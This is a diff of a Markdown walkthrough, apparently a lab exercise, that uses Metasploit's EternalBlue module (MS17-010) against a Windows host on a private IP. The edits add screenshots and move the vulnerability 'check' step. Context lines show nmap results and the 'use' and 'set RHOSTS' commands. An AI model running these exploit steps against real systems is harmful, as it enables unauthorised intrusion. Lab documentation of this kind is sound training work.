@@ -67,6 +67,8 @@ PORT      STATE SERVICE      VERSION
 49156/tcp open  msrpc        Microsoft Windows RPC
 ```
 
+<img width="1085" height="820" alt="image" src="https://github.com/user-attachments/assets/39facd8d-6d89-4811-ada2-4aafa970bafa" />
+
 ### Key Observations
 
 - **Port 445 (SMB) is open**
@@ -131,6 +133,8 @@ Relevant module identified:
 exploit/windows/smb/ms17_010_eternalblue
 ```
 
+<img width="1435" height="661" alt="image" src="https://github.com/user-attachments/assets/5525e2d5-c61b-47f3-a02e-ad1daca8bd56" />
+
 ---
 
 ## Select the Exploit Module
@@ -147,6 +151,16 @@ use exploit/windows/smb/ms17_010_eternalblue
 set RHOSTS 192.168.88.130
 ```
 
+Before launching the exploit, a vulnerability check was performed:
+
+```bash
+check
+```
+
+The result indicated the system was **likely vulnerable to MS17-010**.
+
+<img width="975" height="116" alt="image" src="https://github.com/user-attachments/assets/d15e1e8b-6d5e-4c75-9108-a795efcb7685" />
+
 ---
 
 ## Verify Module Configuration
@@ -155,17 +169,7 @@ set RHOSTS 192.168.88.130
 options
 ```
 
----
-
-## Check if Target is Vulnerable
-
-Before launching the exploit, a vulnerability check was performed:
-
-```bash
-check
-```
-
-The result indicated the system was **likely vulnerable to MS17-010**.
+<img width="1559" height="529" alt="image" src="https://github.com/user-attachments/assets/c1dd60b8-ccc7-4764-9dc0-109533e48f06" />
 
 ---
 
